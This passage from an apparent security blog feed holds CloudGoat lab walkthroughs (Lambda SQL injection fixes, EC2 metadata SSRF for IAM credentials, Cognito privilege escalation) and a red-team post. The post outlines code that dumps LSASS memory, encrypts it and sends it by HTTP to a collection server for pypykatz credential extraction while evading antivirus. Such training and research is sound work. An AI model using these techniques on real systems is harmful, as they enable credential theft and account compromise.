class="line">cursor.execute(&quot;SELECT policy_name FROM policies WHERE policy_name = ? AND public = &#x27;True&#x27;&quot;, (policy,))</span><br></pre></td></tr></table></figure><ol start="2"><li>Input Validation: Implement strict input validation</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">def validate_policy_name(policy_name):</span><br><span class="line">    # Only allow alphanumeric characters, hyphens, and underscores</span><br><span class="line">    if not re.match(r&#x27;^[a-zA-Z0-9_-]+$&#x27;, policy_name):</span><br><span class="line">        raise ValueError(&quot;Invalid policy name format&quot;)</span><br><span class="line">    return policy_name</span><br></pre></td></tr></table></figure><ol start="3"><li>Use ORM: Consider using an ORM like SQLAlchemy that provides built-in protection</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from sqlalchemy import text</span><br><span class="line"></span><br><span class="line"># Secure parameterized query</span><br><span class="line">result = session.execute(</span><br><span class="line">    text(&quot;SELECT policy_name FROM policies WHERE policy_name = :policy AND public = &#x27;True&#x27;&quot;),</span><br><span class="line">    &#123;&quot;policy&quot;: policy&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><ol start="4"><li><p>Principle of Least Privilege: Limit Lambda execution role permissions to only what’s necessary</p></li><li><p>Code Review: Implement mandatory security code reviews for all Lambda functions</p></li></ol><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>This CloudGoat walkthrough demonstrates how SQL injection vulnerabilities in Lambda functions can lead to complete AWS account compromise. The scenario highlights the importance of:</p><ul><li>Secure coding practices in serverless environments</li><li>Proper input validation and parameterized queries</li><li>Regular security assessments using tools like <a href="https://github.com/PanosoikoGr/CloudTap">CloudTap</a></li><li>Implementing the principle of least privilege</li></ul><p><a href="https://github.com/PanosoikoGr/CloudTap">CloudTap</a> proved invaluable in this assessment by automating the enumeration process, discovering permissions, and automatically assuming roles, significantly speeding up the penetration testing workflow for this CloudGoat lambda scenario.</p>]]></content>
      
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> CloudGoat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CloudGoat-Cloud_Breach_S3</title>
      <link href="/2025/06/02/CloudGoat-Cloud-Breach-S3/"/>
      <url>/2025/06/02/CloudGoat-Cloud-Breach-S3/</url>
      
        <content type="html"><![CDATA[<h1 id="Cloud-Breach-S3-CloudGoat-Walkthrough"><a href="#Cloud-Breach-S3-CloudGoat-Walkthrough" class="headerlink" title="Cloud Breach S3 - CloudGoat Walkthrough"></a>Cloud Breach S3 - CloudGoat Walkthrough</h1><p>This walkthrough demonstrates a complete penetration test of the CloudGoat “cloud_breach_s3” scenario, showcasing how attackers can exploit misconfigured AWS EC2 instances to access sensitive S3 data. The scenario involves exploiting an EC2 metadata service proxy to retrieve IAM credentials and subsequently accessing restricted S3 buckets containing sensitive information.</p><p>This CloudGoat walkthrough covers essential AWS security concepts including EC2 metadata service abuse, IAM credential extraction, and S3 bucket enumeration using automated tools like CloudTap.</p><h2 id="Initial-Setup"><a href="#Initial-Setup" class="headerlink" title="Initial Setup"></a>Initial Setup</h2><p>Starting CloudGoat, first we should whitelist our IP:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat config whitelist --auto</span><br></pre></td></tr></table></figure><p>Then run the following command to create the scenario:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat create cloud_breach_s3</span><br></pre></td></tr></table></figure><p>We get our initial information:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat_output_aws_account_id = 065855168369</span><br><span class="line">cloudgoat_output_target_ec2_server_ip = 54.224.25.16</span><br></pre></td></tr></table></figure><h2 id="Reconnaissance-Phase"><a href="#Reconnaissance-Phase" class="headerlink" title="Reconnaissance Phase"></a>Reconnaissance Phase</h2><p>Let’s start scanning the machine and see what ports are open:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sC -sV --top-ports=1000 54.224.25.16</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 30:20:b0:04:5a:56:28:9f:91:04:ad:3d:37:9f:64:77 (RSA)</span><br><span class="line">|   256 ee:41:41:e5:55:9e:d9:39:fa:5b:53:b0:91:5f:ba:88 (ECDSA)</span><br><span class="line">|_  256 d2:72:c2:f7:4b:1e:ca:05:16:96:3f:58:8d:ba:49:c6 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (application/octet-stream).</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>There are two ports open <code>22</code> and <code>80</code>. Let’s see what’s hosted on port 80 first:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://54.224.25.16/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;This server is configured to proxy requests to the EC2 metadata service. Please modify your request&#x27;s &#x27;host&#x27; header and try again.&lt;/h1&gt;</span><br></pre></td></tr></table></figure><h2 id="Exploiting-the-EC2-Metadata-Service"><a href="#Exploiting-the-EC2-Metadata-Service" class="headerlink" title="Exploiting the EC2 Metadata Service"></a>Exploiting the EC2 Metadata Service</h2><p>The AWS EC2 metadata service is accessible via <code>http://169.254.169.254/latest/meta-data/</code>.<br>Our goal is to abuse the proxy to retrieve metadata — possibly credentials or a flag stored in a user data script or IAM role credentials.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &quot;Host: 169.254.169.254&quot; http://54.224.25.16/latest/meta-data/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ami-id</span><br><span class="line">ami-launch-index</span><br><span class="line">ami-manifest-path</span><br><span class="line">block-device-mapping/</span><br><span class="line">events/</span><br><span class="line">hibernation/</span><br><span class="line">hostname</span><br><span class="line">iam/</span><br><span class="line">identity-credentials/</span><br><span class="line">instance-action</span><br><span class="line">instance-id</span><br><span class="line">instance-life-cycle</span><br><span class="line">instance-type</span><br><span class="line">local-hostname</span><br><span class="line">local-ipv4</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Now we can access the IAM folder and find the stored credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &quot;Host: 169.254.169.254&quot; http://54.224.25.16/latest/meta-data/iam/security-credentials/cg-banking-WAF-Role-cgid1w9fw6k41a</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;Code&quot; : &quot;Success&quot;,</span><br><span class="line">  &quot;LastUpdated&quot; : &quot;2025-06-02T09:47:46Z&quot;,</span><br><span class="line">  &quot;Type&quot; : &quot;AWS-HMAC&quot;,</span><br><span class="line">  &quot;AccessKeyId&quot; : &quot;ASIAQ6VK#########&quot;,</span><br><span class="line">  &quot;SecretAccessKey&quot; : &quot;vGwJXq/#######################&quot;,</span><br><span class="line">  &quot;Token&quot; : &quot;IQoJb3JpZ2luX2VjECIaCXVzLWVhc3QtMSJIMEYCIQDnHxLZZg2tjMuc1oMRPE5kEbDx1fSXkdgj10uIAdNIZQIhAJNEadIM5+DJO0NlSYWxKOHhlz6TBzFEU9un5lC5Jy9mKsQFCOv//////////wEQABoMMDY1ODU1MTY4MzY5IgxedGWksHmqogwnwUkqmAWHWHPsZcUKi5u0H5qmE46MBnVourgix480tzyAEv1EfaKIbsNzdkyaTsYYzL++JUCN0agA0OE9nhmqAnQ41axHY0twbEKS0HMQhEzM/+47qvnGbvogAChpZkZrXmN1Kdz+l45LpovVvykejrdWgwQC1LPYUNQSYdWBrnbFpPmXEWV2N6WjZJyNT0AeNFiSRz5ROcFQw1BQsMF1j1dhDLDu6BbINBZpdIV4Ef7ggDYvY2J3q1K+pFXOcnR+0aHOiFi6UlPYnOTpQXVMBH4+I9WaCmX90+xN/W3b0gGhdnLPUy1LO#############################&quot;,</span><br><span class="line">  &quot;Expiration&quot; : &quot;2025-06-02T16:22:23Z&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AWS-Configuration-and-Enumeration"><a href="#AWS-Configuration-and-Enumeration" class="headerlink" title="AWS Configuration and Enumeration"></a>AWS Configuration and Enumeration</h2><p>First we need to configure the credentials and the aws_session_token:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws configure --profile init</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws configure set aws_session_token &quot;&lt;TOKEN&gt;&quot; --profile init</span><br></pre></td></tr></table></figure><h2 id="Using-CloudTap-for-Advanced-Enumeration"><a href="#Using-CloudTap-for-Advanced-Enumeration" class="headerlink" title="Using CloudTap for Advanced Enumeration"></a>Using CloudTap for Advanced Enumeration</h2><p>I will be using <a href="https://github.com/PanosoikoGr/CloudTap">CloudTap</a> to enumerate all of the permissions the user we obtained has. CloudTap is a powerful AWS enumeration tool that automatically discovers and exploits AWS permissions, making it invaluable for penetration testing and security assessments.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CloudTap.py --keys init</span><br></pre></td></tr></table></figure><p><img src="/images/Cloud_Breach_S3/s3_bucket.png" alt="S3 Bucket Discovery"></p><p>The CloudTap tool has found an S3 bucket and automatically downloads it. Inside there is sensitive information about credit card numbers and IP addresses, which marks the end of this engagement.</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>This CloudGoat walkthrough demonstrated a complete attack chain from initial reconnaissance to sensitive data exfiltration. The key vulnerabilities exploited were:</p><ol><li>Misconfigured EC2 proxy allowing access to metadata service</li><li>Exposed IAM credentials through metadata service</li><li>Overprivileged S3 access leading to sensitive data exposure</li></ol><p>Tools like CloudTap significantly streamline the AWS enumeration process, automatically discovering and exploiting permissions that manual testing might miss. This scenario highlights the critical importance of properly securing EC2 metadata services and implementing least-privilege IAM policies in AWS environments.</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> CloudGoat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Remote LSASS Snapshot Dump</title>
      <link href="/2025/06/01/Remote-LSASS-Snapshot-Dump/"/>
      <url>/2025/06/01/Remote-LSASS-Snapshot-Dump/</url>
      
        <content type="html"><![CDATA[<h1 id="Remote-LSASS-Snapshot-Dump-with-AES-Encryption-and-HTTP-Exfiltration"><a href="#Remote-LSASS-Snapshot-Dump-with-AES-Encryption-and-HTTP-Exfiltration" class="headerlink" title="Remote LSASS Snapshot Dump with AES Encryption and HTTP Exfiltration"></a>Remote LSASS Snapshot Dump with AES Encryption and HTTP Exfiltration</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>In this post, we’ll walk through a project that captures a snapshot of LSASS (Local Security Authority Subsystem Service) using Windows APIs, encrypts the dump using AES-256 in CBC mode, and securely uploads it via HTTP to a Flask-based server. The server then decrypts and parses the data using pypykatz.</p><p>This approach avoids directly dumping LSASS to disk, leveraging modern snapshotting features (PssCaptureSnapshot) and encryption for stealth and safety.</p><blockquote><p>⚠️ DISCLAIMER:<br>This post is intended strictly for educational purposes. The techniques and code discussed are meant to demonstrate how malware obfuscation and evasion tactics evolve, particularly in the context of defensive research, red teaming, and antivirus testing.<br>I do not condone the use of this information for illegal or malicious purposes and am not responsible for how others choose to use it. The code shared is not production-safe and must not be used in real-world environments without proper authorization.</p></blockquote><h2 id="Components"><a href="#Components" class="headerlink" title="Components"></a>Components</h2><h3 id="Client-Side-Windows-C"><a href="#Client-Side-Windows-C" class="headerlink" title="Client-Side (Windows C++)"></a>Client-Side (Windows C++)</h3><ul><li><p>Captures LSASS process snapshot with PssCaptureSnapshot.</p></li><li><p>Uses MiniDumpWriteDump to write to a temp file.</p></li><li><p>Encrypts the dump using AES-256-CBC via bcrypt.</p></li><li><p>Sends encrypted data, IV, and key via WinHTTP POST.</p></li></ul><h3 id="Server-Side-Python-Flask"><a href="#Server-Side-Python-Flask" class="headerlink" title="Server-Side (Python Flask)"></a>Server-Side (Python Flask)</h3><ul><li><p>Accepts uploads from clients at three endpoints: &#x2F;upload&#x2F;key, &#x2F;upload&#x2F;iv, &#x2F;upload&#x2F;dump.</p></li><li><p>Decrypts received dump.</p></li><li><p>Runs pypykatz on it to extract credentials.</p></li></ul><h2 id="AES-Encryption-Logic"><a href="#AES-Encryption-Logic" class="headerlink" title="AES Encryption Logic"></a>AES Encryption Logic</h2><p>AES encryption is implemented using the bcrypt API, which is the recommended CNG (Cryptography Next Generation) library on Windows.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bool AesEncrypt(const std::vector&lt;BYTE&gt;&amp; plaintext, const std::vector&lt;BYTE&gt;&amp; key,</span><br><span class="line">                std::vector&lt;BYTE&gt;&amp; ciphertext, std::vector&lt;BYTE&gt;&amp; ivOut)</span><br></pre></td></tr></table></figure><ul><li><p>The key must be 16, 24, or 32 bytes (AES-128, AES-192, AES-256).</p></li><li><p>CBC mode is used with a randomly generated 16-byte IV.</p></li><li><p>The ciphertext is padded using PKCS#7 via <code>BCRYPT_BLOCK_PADDING</code>.</p></li></ul><h2 id="LSASS-Snapshot-Capture"><a href="#LSASS-Snapshot-Capture" class="headerlink" title="LSASS Snapshot Capture"></a>LSASS Snapshot Capture</h2><p>To obtain the LSASS dump without causing antivirus alerts:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PssCaptureSnapshot(</span><br><span class="line">    hLsass,</span><br><span class="line">    PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION |</span><br><span class="line">    PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT,</span><br><span class="line">    CONTEXT_ALL,</span><br><span class="line">    &amp;snapshotHandle</span><br><span class="line">);</span><br></pre></td></tr></table></figure><ul><li><code>PssCaptureSnapshot</code> creates a lightweight clone of the LSASS process.</li><li><code>MiniDumpWriteDump</code> writes the dump to a temporary file, flagged as delete-on-close.</li></ul><h2 id="HTTP-Upload-with-WinHTTP"><a href="#HTTP-Upload-with-WinHTTP" class="headerlink" title="HTTP Upload with WinHTTP"></a>HTTP Upload with WinHTTP</h2><p>Data is exfiltrated over HTTP:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HttpPost(L&quot;192.168.1.9&quot;, L&quot;/upload/key&quot;, key);</span><br><span class="line">HttpPost(L&quot;192.168.1.9&quot;, L&quot;/upload/iv&quot;, iv);</span><br><span class="line">HttpPost(L&quot;192.168.1.9&quot;, L&quot;/upload/dump&quot;, ciphertext);</span><br></pre></td></tr></table></figure><ul><li><p>All three components — key, IV, and dump — are sent in order.</p></li><li><p>The server is expected to collect and decrypt once all are received.</p></li></ul><h2 id="Flask-Server-Logic"><a href="#Flask-Server-Logic" class="headerlink" title="Flask Server Logic"></a>Flask Server Logic</h2><p>The Python server receives the key, IV, and ciphertext:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/upload/key&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def upload_key():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    save_data(ip, &quot;key&quot;, request.data)</span><br></pre></td></tr></table></figure><p>It stores them in memory per-client-IP, and when all are present, triggers decryption.<br>Decryption logic:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def decrypt_aes_cbc(ciphertext, key, iv):</span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())</span><br><span class="line">    return cipher.decryptor().update(ciphertext) + cipher.decryptor().finalize()</span><br></pre></td></tr></table></figure><p>Padding is removed manually, and a known marker (e.g. <code>&quot;abcdefghijklmnopqurtwv&quot;</code>) is stripped to validate the structure before saving the dump to disk.</p><h2 id="Credential-Extraction"><a href="#Credential-Extraction" class="headerlink" title="Credential Extraction"></a>Credential Extraction</h2><p>Once the decrypted dump is written to disk, pypykatz is invoked:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subprocess.run([&quot;pypykatz&quot;, &quot;lsa&quot;, &quot;minidump&quot;, filename])</span><br></pre></td></tr></table></figure><ul><li>If the dump is valid, pypykatz parses and prints credentials from LSASS.</li></ul><h2 id="Example-Output"><a href="#Example-Output" class="headerlink" title="Example Output"></a>Example Output</h2><p>Here’s what a successful run looks like on the client:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Generating AES key...</span><br><span class="line">[+] Starting LSASS snapshot dump using PssCaptureSnapshot...</span><br><span class="line">[*] Encrypting data...</span><br><span class="line">[+] Encryption successful!</span><br><span class="line">[*] Sending AES key...</span><br><span class="line">[*] Sending AES IV...</span><br><span class="line">[*] Sending encrypted dump...</span><br><span class="line">[+] Upload completed.</span><br></pre></td></tr></table></figure><p>And on the server:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[] Attempting decryption for 192.168.1.10...</span><br><span class="line">[+] Decrypted dump saved to uploads/decrypteddump_192.168.1.10_20250601_140102.bin</span><br><span class="line">[] Running pypykatz on decrypteddump...</span><br><span class="line">[+] pypykatz output:</span><br><span class="line">    [0] sekurlsa::logonpasswords</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><h2 id="Security-Ethical-Reminder"><a href="#Security-Ethical-Reminder" class="headerlink" title="Security &amp; Ethical Reminder"></a>Security &amp; Ethical Reminder</h2><p>This project demonstrates advanced Windows internals and encryption usage and should only be used for educational purposes, security research, or red team assessments in authorized environments.</p><p>Dumping LSASS is a sensitive action and often flagged by EDR&#x2F;AV solutions. Always have proper authorization.</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>This toolchain demonstrates:</p><ul><li><p>Using modern Windows APIs (PssCaptureSnapshot) for stealthy memory capture.</p></li><li><p>Strong AES encryption to protect sensitive data in transit.</p></li><li><p>Minimal HTTP server for secure ingestion and automated credential parsing.</p></li></ul><p>It’s an excellent example of combining Windows internals, cryptography, and Python scripting in a red team toolkit.</p>]]></content>
      
      
      
        <tags>
            
            <tag> Lsass </tag>
            
            <tag> RedTeam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cloudgoat-Vulnerable_Cognito</title>
      <link href="/2025/05/29/Cloudgoat-Vulnerable-Cognito/"/>
      <url>/2025/05/29/Cloudgoat-Vulnerable-Cognito/</url>
      
        <content type="html"><![CDATA[<h1 id="CloudGoat-Vulnerable-Cognito-‑-Complete-AWS-Security-Lab-Walkthrough"><a href="#CloudGoat-Vulnerable-Cognito-‑-Complete-AWS-Security-Lab-Walkthrough" class="headerlink" title="CloudGoat Vulnerable Cognito ‑ Complete AWS Security Lab Walkthrough"></a>CloudGoat Vulnerable Cognito ‑ Complete AWS Security Lab Walkthrough</h1><p>Amazon Cognito is a powerful identity management service, but misconfigurations can lead to serious security vulnerabilities. This comprehensive walkthrough demonstrates how to exploit a vulnerable AWS Cognito implementation using CloudGoat, Rhino Security Labs’ intentionally vulnerable AWS infrastructure tool. Through this hands-on CloudGoat AWS security lab, we’ll explore authentication bypass techniques, JWT token manipulation, and privilege escalation in Amazon Cognito environments.</p><h2 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><p>Before diving into the exploitation phase, we need to properly configure our CloudGoat environment. CloudGoat requires IP whitelisting to ensure secure access to the vulnerable infrastructure.</p><p>First, configure CloudGoat to whitelist your current IP address automatically:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat config whitelist --auto</span><br></pre></td></tr></table></figure><p>Next, deploy the vulnerable Cognito scenario:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat create vulnerable_cognito</span><br></pre></td></tr></table></figure><p>Upon successful deployment, CloudGoat provides essential connection details:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apigateway_url = https://[REDACTED].execute-api.us-east-1.amazonaws.com/</span><br><span class="line">cloudgoat_output_aws_account_id = [REDACTED]</span><br></pre></td></tr></table></figure><h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><p>The deployed application presents a standard login interface requiring user registration and email verification. This is where most legitimate users would stop, but security researchers know that the real vulnerabilities often lie beneath the surface.</p><p><img src="/images/Cognito_Priv/login.png" alt="Image: Login Interface"></p><p>While the application requires email confirmation for account activation, examining the source code reveals critical configuration details that will prove invaluable for our exploitation attempt.</p><p><img src="/images/Cognito_Priv/pool.png" alt="Image: Cognito Pool Configuration"></p><h3 id="Extracted-Cognito-Configuration"><a href="#Extracted-Cognito-Configuration" class="headerlink" title="Extracted Cognito Configuration"></a>Extracted Cognito Configuration</h3><p>Through source code analysis, we can identify the following critical Cognito parameters:</p><ul><li>User Pool ID: <code>us-east-1_[REDACTED]</code></li><li>App Client ID: <code>[REDACTED]</code></li><li>Auth Flow: <code>USER_PASSWORD_AUTH</code> (available but commented in source)</li></ul><p>This information forms the foundation for our CLI-based exploitation approach.</p><h2 id="Bypassing-Email-Verification"><a href="#Bypassing-Email-Verification" class="headerlink" title="Bypassing Email Verification"></a>Bypassing Email Verification</h2><p>Rather than relying on email verification, we can leverage the AWS CLI to create and confirm user accounts directly. This approach bypasses potential email delivery issues and provides more control over the registration process.</p><p>Create a new user account using the AWS Cognito Identity Provider CLI:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws cognito-idp sign-up   --client-id [CLIENT_ID]   --username your-email@example.com   --password &#x27;SecurePassword123!&#x27;   --user-attributes     Name=&quot;email&quot;,Value=&quot;your-email@example.com&quot;     Name=&quot;given_name&quot;,Value=&quot;TestUser&quot;     Name=&quot;family_name&quot;,Value=&quot;Security&quot;   --region us-east-1</span><br></pre></td></tr></table></figure><p>Note that the <code>family_name</code> attribute is mandatory for this particular Cognito configuration. The response confirms successful user creation:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;UserConfirmed&quot;: false,</span><br><span class="line">    &quot;CodeDeliveryDetails&quot;: &#123;</span><br><span class="line">        &quot;Destination&quot;: &quot;y***@e***&quot;,</span><br><span class="line">        &quot;DeliveryMedium&quot;: &quot;EMAIL&quot;,</span><br><span class="line">        &quot;AttributeName&quot;: &quot;email&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;UserSub&quot;: &quot;[USER_ID]&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>After receiving the verification code via email, confirm the account registration:</p><p><img src="/images/Cognito_Priv/ver_code.png" alt="Image: Email Verification Code"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws cognito-idp confirm-sign-up   --client-id [CLIENT_ID]   --username your-email@example.com   --confirmation-code [VERIFICATION_CODE]   --region us-east-1</span><br></pre></td></tr></table></figure><h2 id="Discovering-Privilege-Escalation-Opportunities"><a href="#Discovering-Privilege-Escalation-Opportunities" class="headerlink" title="Discovering Privilege Escalation Opportunities"></a>Discovering Privilege Escalation Opportunities</h2><p>With a confirmed account, we can now access the application. However, initial access reveals limited functionality - we’re restricted to a basic reader interface. Examining the application’s JavaScript code reveals the authorization logic:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">console.log(access)</span><br><span class="line">if(access == &#x27;admin&#x27;)&#123;</span><br><span class="line">  window.location = &quot;./admin.html&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">  window.location = &quot;./reader.html&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This code snippet indicates that user privileges are determined by an <code>access</code> attribute, suggesting potential for privilege escalation if we can modify this value.</p><p><img src="/images/Cognito_Priv/after_sign.png" alt="Image: Post-Authentication Interface"></p><h2 id="JWT-Token-Analysis-and-AWS-Credentials"><a href="#JWT-Token-Analysis-and-AWS-Credentials" class="headerlink" title="JWT Token Analysis and AWS Credentials"></a>JWT Token Analysis and AWS Credentials</h2><p>To understand the application’s authentication mechanism, we need to examine the JWT tokens issued by Cognito. Generate an access token using the AWS CLI:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws cognito-idp initiate-auth   --client-id [CLIENT_ID]   --auth-flow USER_PASSWORD_AUTH   --auth-parameters USERNAME=your-email@example.com,PASSWORD=&#x27;SecurePassword123!&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Cognito_Priv/jtw_token.png" alt="Image: JWT Token Response"></p><p>Decoding the access token using tools like <a href="jwt.io">jwt.io</a> reveals crucial information about the token structure and issuer. The <code>iss</code> (issuer) field contains the User Pool ID, which we’ll need for subsequent exploitation steps.</p><p><img src="/images/Cognito_Priv/jwt_dec.png" alt="Image: JWT Token Decoded"></p><p>Amazon Cognito’s JWT implementation provides several advantages including simplified authentication workflows, enhanced scalability, and seamless integration with other AWS services. However, these tokens also contain user attribute information that may be modifiable.</p><h2 id="User-Attribute-Manipulation"><a href="#User-Attribute-Manipulation" class="headerlink" title="User Attribute Manipulation"></a>User Attribute Manipulation</h2><p>Using our access token, we can query our current user attributes to understand the permission structure:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws cognito-idp get-user --access-token [ACCESS_TOKEN]</span><br></pre></td></tr></table></figure><p>The response reveals our current user profile, including the critical <code>custom:access</code> attribute:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 